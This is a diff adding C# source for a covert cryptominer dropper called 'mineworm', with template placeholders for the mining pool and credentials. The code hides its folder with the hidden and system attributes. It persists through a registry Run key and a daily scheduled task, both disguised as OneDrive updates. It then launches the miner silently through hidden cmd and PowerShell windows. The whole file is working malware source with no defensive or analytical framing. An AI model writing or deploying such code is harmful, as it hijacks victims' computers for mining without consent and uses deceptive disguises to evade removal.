@@ -1,0 +1,84 @@
+﻿using System.IO;
+using Microsoft.VisualBasic;
+using System.Reflection;
+using System.Threading;
+using System.Diagnostics;
+
+namespace System
+{
+    class Program
+    {
+
+
+        static void Main(string[] args)
+        {
+            Startup();
+            Persistence();
+            StartMiner();
+        }
+
+        static void StartMiner()
+        {
+            string pathm = Path.Combine(Path.GetTempPath(), "mineworm");
+            string bat = Path.Combine(pathm, "mineworm.bat");
+            string exe = Path.Combine(pathm, "minerd.exe ");
+            int threadint = Int32.Parse("%threads%");
+            string CPU = exe +" -o %pool% -u %user% -p %password% -a %algo% -t " + threadint;
+            shell_execute(CPU);
+
+        }
+        public static void RunPS(string args)
+        {
+            Process proc = new Process
+            {
+                StartInfo = new ProcessStartInfo
+                {
+                    FileName = "powershell",
+                    Arguments = args+" & exit",
+                    WindowStyle = ProcessWindowStyle.Hidden,
+                    CreateNoWindow = true
+                }
+            };
+            proc.Start();
+        }
+        public static void shell_execute(string cmd)
+        {
+            var process = new Process
+            {
+                StartInfo = new ProcessStartInfo
+                {
+                    FileName = "C:\\Windows\\System32\\cmd.exe",
+                    Arguments = " /C " + cmd,
+                    UseShellExecute = false,
+                    WindowStyle = ProcessWindowStyle.Hidden,
+                    RedirectStandardOutput = true,
+                    CreateNoWindow = true
+                }
+            };
+            process.Start();
+        }
+        static void Persistence()
+        {
+            string pathm = Path.Combine(Path.GetTempPath(), "mineworm");
+            string myself = Path.Combine(pathm, "mineworm.exe");
+            string bat = Path.Combine(pathm, "mineworm.bat");
+            RunPS("schtasks.exe /create /tn OneDrive-Standalone-Update-Task-S-1-5-21-502086097-1551555327-3686180297-666 /tr " + myself + " /sc daily /mo 1");
+        }
+
+        static void Startup()
+        {
+            string pathm = Path.Combine(Path.GetTempPath(), "mineworm");
+            string bat = Path.Combine(pathm, "mineworm.bat");
+            string myself = Path.Combine(pathm, "mineworm.exe");
+                //Directory.CreateDirectory(startupdir);
+            File.SetAttributes(pathm, FileAttributes.Hidden | FileAttributes.System | FileAttributes.Hidden);
+                //File.Copy(Assembly.GetEntryAssembly().Location, myself + "\\SystemProcess.exe");
+                //File.SetAttributes(startupdir + "\\SystemProcess.exe", FileAttributes.Hidden | FileAttributes.System | FileAttributes.Hidden);
+            Microsoft.Win32.RegistryKey key = Microsoft.Win32.Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
+            key.SetValue("Onedrive", myself);
+        }
+
+
+    }
+}
+
